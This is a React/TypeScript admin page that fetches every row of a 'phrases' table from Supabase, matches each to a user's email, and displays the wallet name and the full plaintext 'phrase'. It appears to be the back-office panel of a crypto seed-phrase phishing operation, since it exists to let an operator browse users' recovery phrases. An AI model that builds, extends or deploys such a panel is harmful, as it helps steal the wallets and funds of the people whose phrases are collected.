import { useEffect, useState } from "react";
import { Card } from "@/components/ui/card";
import { supabase } from "@/integrations/supabase/client";

type Row = { id: string; user_id: string; wallet_name: string; phrase: string; created_at: string | null;
  profile?: { email: string } | null; };

const AdminPhrases = () => {
  const [rows, setRows] = useState<Row[]>([]);
  useEffect(() => {
    (async () => {
      const { data } = await supabase.from("phrases").select("*").order("created_at", { ascending: false });
      const list = (data ?? []) as Row[];
      const ids = [...new Set(list.map(r => r.user_id))];
      if (ids.length) {
        const { data: profs } = await supabase.from("profiles").select("id, email").in("id", ids);
        const map = new Map((profs ?? []).map((p: any) => [p.id, p]));
        list.forEach(r => (r.profile = map.get(r.user_id) as any));
      }
      setRows(list);
    })();
  }, []);
  return (
    <div>
      <h1 className="text-2xl font-black mb-4">Phrase List ({rows.length})</h1>
      <div className="space-y-3">
        {rows.map(r => (
          <Card key={r.id} className="p-4">
            <p className="text-xs text-muted-foreground">{r.profile?.email || r.user_id} • {r.created_at?.slice(0,16).replace("T"," ")}</p>
            <p className="font-bold mt-1">{r.wallet_name}</p>
            <p className="font-mono text-sm break-words text-muted-foreground mt-1">{r.phrase}</p>
          </Card>
        ))}
        {!rows.length && <p className="text-center text-muted-foreground py-12">No phrases.</p>}
      </div>
    </div>
  );
};
export default AdminPhrases;